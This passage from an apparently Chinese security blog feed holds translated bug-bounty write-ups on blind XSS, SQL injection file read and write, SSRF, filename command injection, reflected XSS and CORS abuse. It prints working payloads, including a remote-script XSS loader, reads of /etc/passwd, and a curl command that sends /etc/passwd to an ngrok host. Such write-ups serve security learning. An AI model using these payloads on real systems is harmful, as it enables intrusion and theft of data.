<h4 id="最后的最后，我们想要制作一个Blind-XSS来攻击真正的管理员，所以最终的payload是"><a href="#最后的最后，我们想要制作一个Blind-XSS来攻击真正的管理员，所以最终的payload是" class="headerlink" title="最后的最后，我们想要制作一个Blind XSS来攻击真正的管理员，所以最终的payload是"></a>最后的最后，我们想要制作一个Blind XSS来攻击真正的管理员，所以最终的payload是</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">javascript:eval(&apos;window.s=document.createElement(\&apos;script\&apos;);window.s.src=\&apos;//xsspt.com/SLEPOE\&apos;;document.body.appendChild(window.s)&apos;);s=&apos;https://s.com&apos;</div></pre></td></tr></table></figure>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_16/7.jpg" alt=""></p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[第十五篇：SQL注入读取、写入文件]]></title>
      <url>/2019/02/14/%E7%AC%AC%E5%8D%81%E4%BA%94%E7%AF%87%EF%BC%9ASQL%E6%B3%A8%E5%85%A5%E8%AF%BB%E5%8F%96%E3%80%81%E5%86%99%E5%85%A5%E6%96%87%E4%BB%B6/</url>
      <content type="html"><![CDATA[<h4 id="原文：SQL-injection-with-load-file-and-into-outfile"><a href="#原文：SQL-injection-with-load-file-and-into-outfile" class="headerlink" title="原文：SQL injection with load file and into outfile"></a>原文：<a href="https://medium.com/bugbountywriteup/sql-injection-with-load-file-and-into-outfile-c62f7d92c4e2" target="_blank" rel="external">SQL injection with load file and into outfile</a></h4><h4 id="漏洞：SQL注入漏洞"><a href="#漏洞：SQL注入漏洞" class="headerlink" title="漏洞：SQL注入漏洞"></a>漏洞：SQL注入漏洞</h4><h4 id="作者：NoGe"><a href="#作者：NoGe" class="headerlink" title="作者：NoGe"></a>作者：<a href="https://medium.com/@p4c3n0g3" target="_blank" rel="external">NoGe</a></h4><h4 id="难度：低"><a href="#难度：低" class="headerlink" title="难度：低"></a>难度：低</h4><a id="more"></a>
<h4 id="我像往常一样注册网站会员"><a href="#我像往常一样注册网站会员" class="headerlink" title="我像往常一样注册网站会员"></a>我像往常一样注册网站会员</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_15/1.png" alt=""></p>
<h4 id="然后通过POST方法将表单信息发送到-https-www-blablabla-com-svc-form-affiliate。"><a href="#然后通过POST方法将表单信息发送到-https-www-blablabla-com-svc-form-affiliate。" class="headerlink" title="然后通过POST方法将表单信息发送到 https://www.blablabla.com/svc/*****/form_affiliate。"></a>然后通过POST方法将表单信息发送到 <a href="https://www.blablabla.com/svc/*****/form_affiliate。" target="_blank" rel="external">https://www.blablabla.com/svc/*****/form_affiliate。</a></h4><h4 id="这里的email参数存在SQL注入漏洞"><a href="#这里的email参数存在SQL注入漏洞" class="headerlink" title="这里的email参数存在SQL注入漏洞"></a>这里的email参数存在SQL注入漏洞</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_15/2.png" alt=""></p>
<h4 id="于是我在请求框-email-””-参数中插入SQL语句"><a href="#于是我在请求框-email-””-参数中插入SQL语句" class="headerlink" title="于是我在请求框 [email=””]参数中插入SQL语句"></a>于是我在请求框 [email=””]参数中插入SQL语句</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&apos; and 1=2 union all select concat_ws(0x3a,version(),user(),database())--+</div></pre></td></tr></table></figure>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_15/3.png" alt=""></p>
<h4 id="结果在响应窗口显示-“5-5-41-log-root-10-130-0-1-tp-cart”。"><a href="#结果在响应窗口显示-“5-5-41-log-root-10-130-0-1-tp-cart”。" class="headerlink" title="结果在响应窗口显示 “5.5.41-log:root@10.130.0.1:tp_cart”。"></a>结果在响应窗口显示 “5.5.41-log:root@10.130.0.1:tp_cart”。</h4><h4 id="现在我尝试使用SQL命令来读取文件"><a href="#现在我尝试使用SQL命令来读取文件" class="headerlink" title="现在我尝试使用SQL命令来读取文件"></a>现在我尝试使用SQL命令来读取文件</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&apos; and 1=2 union all select load_file(&apos;/etc/passwd&apos;)--+</div></pre></td></tr></table></figure>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_15/4.png" alt=""></p>
<h4 id="接着尝试在-tmp目录写入文件"><a href="#接着尝试在-tmp目录写入文件" class="headerlink" title="接着尝试在/tmp目录写入文件"></a>接着尝试在/tmp目录写入文件</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&apos; and 1=2 union all select &apos;blablalba_bug_bounty_program&apos; into outfile &apos;/tmp/blablabla&apos;--+</div></pre></td></tr></table></figure>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_15/5.png" alt=""></p>
<h4 id="最后我们看看文件是否成功写入"><a href="#最后我们看看文件是否成功写入" class="headerlink" title="最后我们看看文件是否成功写入"></a>最后我们看看文件是否成功写入</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&apos; and 1=2 union all select load_file(&apos;/tmp/blablabla&apos;)--+</div></pre></td></tr></table></figure>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_15/6.png" alt=""></p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[第十四篇：SSRF读取本地文件]]></title>
      <url>/2019/02/14/%E7%AC%AC%E5%8D%81%E5%9B%9B%E7%AF%87%EF%BC%9ASSRF%E8%AF%BB%E5%8F%96%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6/</url>
      <content type="html"><![CDATA[<h4 id="原文：Server-Side-Request-Forgery-SSRF-Testing"><a href="#原文：Server-Side-Request-Forgery-SSRF-Testing" class="headerlink" title="原文：Server Side Request Forgery(SSRF) Testing"></a>原文：<a href="https://medium.com/bugbountywriteup/command-injection-poc-72cc3743f10d" target="_blank" rel="external"><em>Server Side Request Forgery</em>(<em>SSRF</em>) Testing</a></h4><h4 id="漏洞：SSRF漏洞"><a href="#漏洞：SSRF漏洞" class="headerlink" title="漏洞：SSRF漏洞"></a>漏洞：SSRF漏洞</h4><h4 id="作者：NoGe"><a href="#作者：NoGe" class="headerlink" title="作者：NoGe"></a>作者：<a href="https://medium.com/@p4c3n0g3" target="_blank" rel="external">NoGe</a></h4><h4 id="难度：低"><a href="#难度：低" class="headerlink" title="难度：低"></a>难度：低</h4><a id="more"></a>
<h4 id="我发现一个存在SSRF的随机web网站，为了利用它我应该将输入数据编码为base64格式，下面是正常的URL，这会将我们定位到我们提供的url地址上面去"><a href="#我发现一个存在SSRF的随机web网站，为了利用它我应该将输入数据编码为base64格式，下面是正常的URL，这会将我们定位到我们提供的url地址上面去" class="headerlink" title="我发现一个存在SSRF的随机web网站，为了利用它我应该将输入数据编码为base64格式，下面是正常的URL，这会将我们定位到我们提供的url地址上面去"></a>我发现一个存在SSRF的随机web网站，为了利用它我应该将输入数据编码为base64格式，下面是正常的URL，这会将我们定位到我们提供的url地址上面去</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://playfreedownloadgames.com:2483/proxy.php?url=aHR0cDovL3d3dy50b3A4MHNnYW1lcy5jb20vc2l0ZS9jb250ZW50L3BhY21hbg==</div></pre></td></tr></table></figure>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_14/1.png" alt=""></p>
<h4 id="所以让我们尝试编码http-127-0-0-1-80，并将它传给url参数aHR0cDovLzEyNy4wLjAuMTo4MA"><a href="#所以让我们尝试编码http-127-0-0-1-80，并将它传给url参数aHR0cDovLzEyNy4wLjAuMTo4MA" class="headerlink" title="所以让我们尝试编码http://127.0.0.1:80，并将它传给url参数aHR0cDovLzEyNy4wLjAuMTo4MA=="></a>所以让我们尝试编码<a href="http://127.0.0.1:80，并将它传给url参数aHR0cDovLzEyNy4wLjAuMTo4MA==" target="_blank" rel="external">http://127.0.0.1:80，并将它传给url参数aHR0cDovLzEyNy4wLjAuMTo4MA==</a></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://playfreedownloadgames.com:2483/proxy.php?url=aHR0cDovLzEyNy4wLjAuMTo4MA==</div></pre></td></tr></table></figure>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_14/2.png" alt=""></p>
<h4 id="尝试一下443端口"><a href="#尝试一下443端口" class="headerlink" title="尝试一下443端口"></a>尝试一下443端口</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_14/3.png" alt=""></p>
<h4 id="出现Bad-Request响应是因为我们使用HTTP但是使用了443端口。现在我们继续尝试gopher、dict和sftp。我将在我的VPS中监听1337端口"><a href="#出现Bad-Request响应是因为我们使用HTTP但是使用了443端口。现在我们继续尝试gopher、dict和sftp。我将在我的VPS中监听1337端口" class="headerlink" title="出现Bad Request响应是因为我们使用HTTP但是使用了443端口。现在我们继续尝试gopher、dict和sftp。我将在我的VPS中监听1337端口"></a>出现Bad Request响应是因为我们使用HTTP但是使用了443端口。现在我们继续尝试gopher、dict和sftp。我将在我的VPS中监听1337端口</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">gopher://my_vps_ip:1337/_pacenoge</div><div class="line">dict://my_vps_ip:1337</div><div class="line"> sftp://my_vps_ip:1337</div></pre></td></tr></table></figure>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_14/4.png" alt=""></p>
<h4 id="可以看到上述请求都成功了。但还有什么我们没有尝试呢？对了，是file-etc-passwd"><a href="#可以看到上述请求都成功了。但还有什么我们没有尝试呢？对了，是file-etc-passwd" class="headerlink" title="可以看到上述请求都成功了。但还有什么我们没有尝试呢？对了，是file:///etc/passwd"></a>可以看到上述请求都成功了。但还有什么我们没有尝试呢？对了，是file:///etc/passwd</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">file:///etc/passwd</div></pre></td></tr></table></figure>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_14/5.png" alt=""></p>
<h4 id="接着我想看看httpd-conf"><a href="#接着我想看看httpd-conf" class="headerlink" title="接着我想看看httpd.conf"></a>接着我想看看httpd.conf</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">file:///etc/httpd/conf/httpd.conf</div></pre></td></tr></table></figure>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_14/6.png" alt=""></p>
<h4 id="通过阅读httpd-conf文件我知道了web服务的根目录-home-playfreedownloadgames-public-html-所以我可以读取proxy-php的文件内容"><a href="#通过阅读httpd-conf文件我知道了web服务的根目录-home-playfreedownloadgames-public-html-所以我可以读取proxy-php的文件内容" class="headerlink" title="通过阅读httpd.conf文件我知道了web服务的根目录/home/playfreedownloadgames/public_html 所以我可以读取proxy.php的文件内容"></a>通过阅读httpd.conf文件我知道了web服务的根目录/home/playfreedownloadgames/public_html 所以我可以读取proxy.php的文件内容</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">file:////home/playfreedownloadgames/public_html/proxy.php</div></pre></td></tr></table></figure>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_14/7.png" alt=""></p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[第十三篇：命令执行]]></title>
      <url>/2019/02/14/%E7%AC%AC%E5%8D%81%E4%B8%89%E7%AF%87%EF%BC%9A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
      <content type="html"><![CDATA[<h4 id="原文：Command-Injection-PoC"><a href="#原文：Command-Injection-PoC" class="headerlink" title="原文：Command Injection PoC"></a>原文：<a href="https://medium.com/bugbountywriteup/command-injection-poc-72cc3743f10d" target="_blank" rel="external">Command Injection PoC</a></h4><h4 id="漏洞：文件名导致RCE"><a href="#漏洞：文件名导致RCE" class="headerlink" title="漏洞：文件名导致RCE"></a>漏洞：文件名导致RCE</h4><h4 id="作者：NoGe"><a href="#作者：NoGe" class="headerlink" title="作者：NoGe"></a>作者：<a href="https://medium.com/@p4c3n0g3" target="_blank" rel="external">NoGe</a></h4><h4 id="难度：中"><a href="#难度：中" class="headerlink" title="难度：中"></a>难度：中</h4><a id="more"></a>
<h4 id="我在某个招聘网站发现了一个命令注入漏洞，很有趣的是它的注入参数居然是文件名，下面是漏洞复现过程！"><a href="#我在某个招聘网站发现了一个命令注入漏洞，很有趣的是它的注入参数居然是文件名，下面是漏洞复现过程！" class="headerlink" title="我在某个招聘网站发现了一个命令注入漏洞，很有趣的是它的注入参数居然是文件名，下面是漏洞复现过程！"></a>我在某个招聘网站发现了一个命令注入漏洞，很有趣的是它的注入参数居然是文件名，下面是漏洞复现过程！</h4><h4 id="首先我用命令”sleep-5”来对参数进行测试，发现响应延迟了5-6秒"><a href="#首先我用命令”sleep-5”来对参数进行测试，发现响应延迟了5-6秒" class="headerlink" title="首先我用命令”sleep 5”来对参数进行测试，发现响应延迟了5-6秒"></a>首先我用命令”sleep 5”来对参数进行测试，发现响应延迟了5-6秒</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_13/1.png" alt=""></p>
<h4 id="我再次用命令”sleep-10”来进行验证，发现响应延迟了10-11秒，这让我确信这里确实存在漏洞"><a href="#我再次用命令”sleep-10”来进行验证，发现响应延迟了10-11秒，这让我确信这里确实存在漏洞" class="headerlink" title="我再次用命令”sleep 10”来进行验证，发现响应延迟了10-11秒，这让我确信这里确实存在漏洞"></a>我再次用命令”sleep 10”来进行验证，发现响应延迟了10-11秒，这让我确信这里确实存在漏洞</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_13/2.png" alt=""></p>
<h4 id="接着我尝试去ping我的服务器”ping-c-5-lt-VPS-IP-gt-”，并在服务器上运行”tcpdump-i-lt-interface-gt-n-icmp”进行抓包"><a href="#接着我尝试去ping我的服务器”ping-c-5-lt-VPS-IP-gt-”，并在服务器上运行”tcpdump-i-lt-interface-gt-n-icmp”进行抓包" class="headerlink" title="接着我尝试去ping我的服务器”ping -c 5 &lt; VPS IP &gt;”，并在服务器上运行”tcpdump -i &lt; interface &gt; -n icmp”进行抓包"></a>接着我尝试去ping我的服务器”ping -c 5 &lt; VPS IP &gt;”，并在服务器上运行”tcpdump -i &lt; interface &gt; -n icmp”进行抓包</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_13/3.png" alt=""></p>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_13/4.png" alt=""></p>
<h4 id="下面我在VPS上用ngrok搭建web服务”-ngrok-http-80”，然后在客户端文件名参数上执行”curl-blablabla-ngrok-io”"><a href="#下面我在VPS上用ngrok搭建web服务”-ngrok-http-80”，然后在客户端文件名参数上执行”curl-blablabla-ngrok-io”" class="headerlink" title="下面我在VPS上用ngrok搭建web服务”./ngrok http 80”，然后在客户端文件名参数上执行”curl blablabla.ngrok.io”"></a>下面我在VPS上用ngrok搭建web服务”./ngrok http 80”，然后在客户端文件名参数上执行”curl blablabla.ngrok.io”</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_13/5.png" alt=""></p>
<h4 id="现在看看ngrok-web界面的响应，我收到来自IP地址000-000-39-169的request请求，这和上面的ICMP请求IP一致"><a href="#现在看看ngrok-web界面的响应，我收到来自IP地址000-000-39-169的request请求，这和上面的ICMP请求IP一致" class="headerlink" title="现在看看ngrok web界面的响应，我收到来自IP地址000.000.39.169的request请求，这和上面的ICMP请求IP一致"></a>现在看看ngrok web界面的响应，我收到来自IP地址000.000.39.169的request请求，这和上面的ICMP请求IP一致</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_13/6.png" alt=""></p>
<h4 id="现在我可以使用命令”curl-F-shl-etc-passwd-blabla-ngrok-io”来读取服务器上的文件并发送到我的ngrok地址。"><a href="#现在我可以使用命令”curl-F-shl-etc-passwd-blabla-ngrok-io”来读取服务器上的文件并发送到我的ngrok地址。" class="headerlink" title="现在我可以使用命令”curl -F shl=@/etc/passwd blabla.ngrok.io”来读取服务器上的文件并发送到我的ngrok地址。"></a>现在我可以使用命令”curl -F shl=@/etc/passwd blabla.ngrok.io”来读取服务器上的文件并发送到我的ngrok地址。</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">curl -F shl=@/etc/passwd blabla.ngrok.io</div></pre></td></tr></table></figure>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_13/7.png" alt=""></p>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_13/8.png" alt=""></p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[第十二篇翻译：反射型XSS]]></title>
      <url>/2018/12/27/%E7%AC%AC%E5%8D%81%E4%BA%8C%E7%AF%87%E7%BF%BB%E8%AF%91%EF%BC%9A%E5%8F%8D%E5%B0%84%E5%9E%8BXSS/</url>
      <content type="html"><![CDATA[<h4 id="原文：My-First-0day-Exploit-Reflected-XSS"><a href="#原文：My-First-0day-Exploit-Reflected-XSS" class="headerlink" title="原文：My First 0day Exploit (Reflected XSS)"></a>原文：<a href="https://medium.com/@alicanact60/my-first-0day-exploit-csp-bypass-reflected-xss-bugbounty-c7efa4bed3d7" target="_blank" rel="external">My First 0day Exploit (Reflected XSS)</a></h4><h4 id="漏洞：javascrip-XSS"><a href="#漏洞：javascrip-XSS" class="headerlink" title="漏洞：javascrip XSS"></a>漏洞：javascrip XSS</h4><h4 id="作者：Ali-TUTUNCU"><a href="#作者：Ali-TUTUNCU" class="headerlink" title="作者：Ali TÜTÜNCÜ"></a>作者：<a href="https://medium.com/@alicanact60?source=post_header_lockup" target="_blank" rel="external">Ali TÜTÜNCÜ</a></h4><h4 id="难度：低"><a href="#难度：低" class="headerlink" title="难度：低"></a>难度：低</h4><a id="more"></a>
<h2 id="步骤："><a href="#步骤：" class="headerlink" title="步骤："></a>步骤：</h2><h4 id="emsp-emsp-1-当我访问网址https-xxx-com-amp-iframe-redirect-scheme-redirect-amp-redirect-strategy-0-时，查看源码看到下面的JS代码"><a href="#emsp-emsp-1-当我访问网址https-xxx-com-amp-iframe-redirect-scheme-redirect-amp-redirect-strategy-0-时，查看源码看到下面的JS代码" class="headerlink" title="&emsp;&emsp;1. 当我访问网址https://xxx.com/amp-iframe-redirect?scheme_redirect=&amp;redirect_strategy=0 时，查看源码看到下面的JS代码"></a>&emsp;&emsp;1. 当我访问网址<a href="https://xxx.com/amp-iframe-redirect?scheme_redirect=&amp;redirect_strategy=0" target="_blank" rel="external">https://xxx.com/amp-iframe-redirect?scheme_redirect=&amp;redirect_strategy=0</a> 时，查看源码看到下面的JS代码</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_12/1.png" alt=""></p>
<h4 id="emsp-emsp-2-然后我开始测试URL参数是否可控，可以看到redirect-strategy参数中的值被嵌入了JS代码中，但是特殊符号被HTML编码了"><a href="#emsp-emsp-2-然后我开始测试URL参数是否可控，可以看到redirect-strategy参数中的值被嵌入了JS代码中，但是特殊符号被HTML编码了" class="headerlink" title="&emsp;&emsp;2. 然后我开始测试URL参数是否可控，可以看到redirect_strategy参数中的值被嵌入了JS代码中，但是特殊符号被HTML编码了"></a>&emsp;&emsp;2. 然后我开始测试URL参数是否可控，可以看到redirect_strategy参数中的值被嵌入了JS代码中，但是特殊符号被HTML编码了</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://xxx.com/amp-iframe-redirect?scheme_redirect=&amp;redirect_strategy=&quot;&apos;&lt;&gt;/();</div></pre></td></tr></table></figure>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_12/2.png" alt=""></p>
<h4 id="emsp-emsp-3-因为正常的XSS语句不能直接使用，所以我只能通过控制JS代码来嵌入XSS语句"><a href="#emsp-emsp-3-因为正常的XSS语句不能直接使用，所以我只能通过控制JS代码来嵌入XSS语句" class="headerlink" title="&emsp;&emsp;3. 因为正常的XSS语句不能直接使用，所以我只能通过控制JS代码来嵌入XSS语句"></a>&emsp;&emsp;3. 因为正常的XSS语句不能直接使用，所以我只能通过控制JS代码来嵌入XSS语句</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://xxx.com/amp-iframe-redirect?scheme_redirect=&amp;redirect_strategy=); alert(document.domain); if(1</div></pre></td></tr></table></figure>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_12/3.png" alt=""></p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[第十一篇翻译：CSRF漏洞]]></title>
      <url>/2018/12/27/%E7%AC%AC%E5%8D%81%E4%B8%80%E7%AF%87%E7%BF%BB%E8%AF%91%EF%BC%9ACSRF%E6%BC%8F%E6%B4%9E/</url>
      <content type="html"><![CDATA[<h4 id="原文：CSRF-account-takeover-Explained-Automated-Manual-—-Bug-Bounty"><a href="#原文：CSRF-account-takeover-Explained-Automated-Manual-—-Bug-Bounty" class="headerlink" title="原文：CSRF account takeover Explained Automated/Manual — Bug Bounty"></a>原文：<a href="https://medium.com/bugbountywriteup/csrf-account-takeover-explained-automated-manual-bug-bounty-447e4b96485b" target="_blank" rel="external">CSRF account takeover Explained Automated/Manual — Bug Bounty</a></h4><h4 id="漏洞：CSRF"><a href="#漏洞：CSRF" class="headerlink" title="漏洞：CSRF"></a>漏洞：CSRF</h4><h4 id="作者：Vulnerables"><a href="#作者：Vulnerables" class="headerlink" title="作者：Vulnerables"></a>作者：<a href="https://medium.com/@vulnerables?source=post_header_lockup" target="_blank" rel="external">Vulnerables</a></h4><h4 id="难度：低"><a href="#难度：低" class="headerlink" title="难度：低"></a>难度：低</h4><a id="more"></a>
<h4 id="emsp-emsp-作者给出的视屏讲解得已经够详细了，很容易理解，我就只给出视屏啦！"><a href="#emsp-emsp-作者给出的视屏讲解得已经够详细了，很容易理解，我就只给出视屏啦！" class="headerlink" title="&emsp;&emsp;作者给出的视屏讲解得已经够详细了，很容易理解，我就只给出视屏啦！"></a>&emsp;&emsp;作者给出的视屏讲解得已经够详细了，很容易理解，我就只给出视屏啦！</h4><p>|</p>
<p>|</p>
<video id="video" controls preload="none" poster="https://ss1.bdstatic.com/70cFuXSh_Q1YnxGkpoWK1HF6hhy/it/u=885582068,2021597601&fm=26&gp=0.jpg"><br><source id="mp4" src="http://img.027cgb.com/612577/times0ng_blog/translate_11/CSRF.mp4" type="video/mp4"><br></video>]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[第十篇翻译：CORS跨域请求]]></title>
      <url>/2018/12/23/%E7%AC%AC%E5%8D%81%E7%AF%87%E7%BF%BB%E8%AF%91%EF%BC%9ACORS%E8%B7%A8%E5%9F%9F%E8%AF%B7%E6%B1%82/</url>
      <content type="html"><![CDATA[<h4 id="原文：Exploiting-Insecure-Cross-Origin-Resource-Sharing-CORS-api-artsy-net"><a href="#原文：Exploiting-Insecure-Cross-Origin-Resource-Sharing-CORS-api-artsy-net" class="headerlink" title="原文：Exploiting Insecure Cross Origin Resource Sharing ( CORS ) | api.artsy.net"></a>原文：<a href="https://blog.securitybreached.org/2017/10/10/exploiting-insecure-cross-origin-resource-sharing-cors-api-artsy-net/" target="_blank" rel="external">Exploiting Insecure Cross Origin Resource Sharing ( CORS ) | api.artsy.net</a></h4><h4 id="漏洞：跨域请求"><a href="#漏洞：跨域请求" class="headerlink" title="漏洞：跨域请求"></a>漏洞：跨域请求</h4><h4 id="作者：Muhammad-Khizer-Javed"><a href="#作者：Muhammad-Khizer-Javed" class="headerlink" title="作者：Muhammad Khizer Javed"></a>作者：<a href="https://blog.securitybreached.org/author/babayaga47/" target="_blank" rel="external">Muhammad Khizer Javed</a></h4><h4 id="难度：低"><a href="#难度：低" class="headerlink" title="难度：低"></a>难度：低</h4><a id="more"></a>
<h4 id="emsp-emsp-大家好！几个月来我测试了许多不同站点的CORS（跨域资源共享）问题，以便我能更实际的了解它。如果想要测试一个站点是否存在CORS漏洞，我们先用curl来检测"><a href="#emsp-emsp-大家好！几个月来我测试了许多不同站点的CORS（跨域资源共享）问题，以便我能更实际的了解它。如果想要测试一个站点是否存在CORS漏洞，我们先用curl来检测" class="headerlink" title="&emsp;&emsp;大家好！几个月来我测试了许多不同站点的CORS（跨域资源共享）问题，以便我能更实际的了解它。如果想要测试一个站点是否存在CORS漏洞，我们先用curl来检测"></a>&emsp;&emsp;大家好！几个月来我测试了许多不同站点的CORS（跨域资源共享）问题，以便我能更实际的了解它。如果想要测试一个站点是否存在CORS漏洞，我们先用curl来检测</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">curl https://api.artsy.net -H &quot;Origin: https://evil.com&quot; -I</div></pre></td></tr></table></figure>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_10/1.png" alt=""></p>
<h4 id="emsp-正如您所见，Curl请求的响应包括如下所示，这意味着该站点存在CORS漏洞"><a href="#emsp-正如您所见，Curl请求的响应包括如下所示，这意味着该站点存在CORS漏洞" class="headerlink" title="&emsp;正如您所见，Curl请求的响应包括如下所示，这意味着该站点存在CORS漏洞"></a>&emsp;正如您所见，Curl请求的响应包括如下所示，这意味着该站点存在CORS漏洞</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Access-Control-Allow-Credentials: true</div><div class="line">Access-Control-Allow-Origin: https://evil.com</div></pre></td></tr></table></figure>
<h4 id="emsp-emsp-现在需要做的就是找一个能获取用户信息的API接口，然后构建我们的EXP站点"><a href="#emsp-emsp-现在需要做的就是找一个能获取用户信息的API接口，然后构建我们的EXP站点" class="headerlink" title="&emsp;&emsp;现在需要做的就是找一个能获取用户信息的API接口，然后构建我们的EXP站点"></a>&emsp;&emsp;现在需要做的就是找一个能获取用户信息的API接口，然后构建我们的EXP站点</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://api.artsy.net/api/user_details/user</div></pre></td></tr></table></figure>
<p>[*]payload代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">function cors() &#123;</div><div class="line">var xhttp = new XMLHttpRequest();</div><div class="line">xhttp.onreadystatechange = function() &#123;</div><div class="line">if (this.readyState == 4 &amp;&amp; this.status == 200) &#123;</div><div class="line">document.getElementById(&quot;demo&quot;).innerHTML =</div><div class="line">alert(this.responseText);</div><div class="line">&#125;</div><div class="line">&#125;;</div><div class="line">xhttp.open(&quot;GET&quot;, &quot;https://api.artsy.net/api/user_details/&lt;User-ID&gt;&quot;, true);</div><div class="line">xhttp.withCredentials = true;</div><div class="line">xhttp.send();</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_10/3.png" alt=""></p>
<h2 id="视屏"><a href="#视屏" class="headerlink" title="视屏"></a>视屏</h2><video id="video" controls preload="none" poster="https://ss1.bdstatic.com/70cFuXSh_Q1YnxGkpoWK1HF6hhy/it/u=885582068,2021597601&fm=26&gp=0.jpg"><br><source id="mp4" src="http://img.027cgb.com/612577/times0ng_blog/translate_10/CORS.mp4" type="video/mp4"><br></video>




<h2 id="打赏译者"><a href="#打赏译者" class="headerlink" title="打赏译者"></a>打赏译者</h2><p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_1/money.png" alt=""></p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[第九篇翻译：CORS跨域请求]]></title>
      <url>/2018/12/23/%E7%AC%AC%E4%B9%9D%E7%AF%87%E7%BF%BB%E8%AF%91%EF%BC%9ACORS%E8%B7%A8%E5%9F%9F%E8%AF%B7%E6%B1%82/</url>
      <content type="html"><![CDATA[<h4 id="原文：Exploitation-of-CORS-Cross-Origin-Resource-Sharing-on-Edmodo"><a href="#原文：Exploitation-of-CORS-Cross-Origin-Resource-Sharing-on-Edmodo" class="headerlink" title="原文：Exploitation of CORS(Cross Origin Resource Sharing) on Edmodo"></a>原文：<a href="https://medium.com/@Skylinearafat/exploitation-of-cors-cross-origin-resource-sharing-on-edmodo-aa90431a3cb6" target="_blank" rel="external">Exploitation of CORS(Cross Origin Resource Sharing) on Edmodo</a></h4><h4 id="漏洞：跨域请求"><a href="#漏洞：跨域请求" class="headerlink" title="漏洞：跨域请求"></a>漏洞：跨域请求</h4><h4 id="作者：Yeasir-Arafat"><a href="#作者：Yeasir-Arafat" class="headerlink" title="作者：Yeasir Arafat"></a>作者：<a href="https://medium.com/@Skylinearafat?source=post_header_lockup" target="_blank" rel="external">Yeasir Arafat</a></h4><h4 id="难度：低"><a href="#难度：低" class="headerlink" title="难度：低"></a>难度：低</h4><a id="more"></a>
